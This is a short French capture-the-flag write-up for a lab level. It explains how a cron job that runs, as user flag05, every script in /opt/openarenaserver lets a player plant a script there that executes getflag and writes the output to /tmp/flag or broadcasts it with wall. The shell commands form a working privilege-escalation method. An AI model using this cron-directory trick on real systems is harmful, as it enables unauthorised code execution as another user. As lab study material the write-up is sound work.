# Level05

---

- En se connectant, on as un message pour indiquer que l'on as un mail,
	dans l'env, on trouve : MAIL=/var/mail

- Dans ce dossier, on trouve un fichier "level05" qui contient la ligne suivante:
>	\*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

- On reconnait une ligne de cron job qui lance un fichier /usr/sbin/openarenaserver
ce qui signifie qu'un job cron troune sur flag05 qui lance /usr/sbin/openarenaserver


- Ce fichier contient le code suivant:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```


- On creer un fichier dans /opt/openarenaserver/ avec la ligne:
> echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && chmod +x /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag

au bout de 3 min le flag et ecrie dans le terminal

Alternativement, on peux ecrire ce script ainsi:
> - echo "getflag | wall" > /opt/openarenaserver/exploit && chmod +x /opt/openarenaserver/exploit
> - echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit && chmod +x /opt/openarenaserver/exploit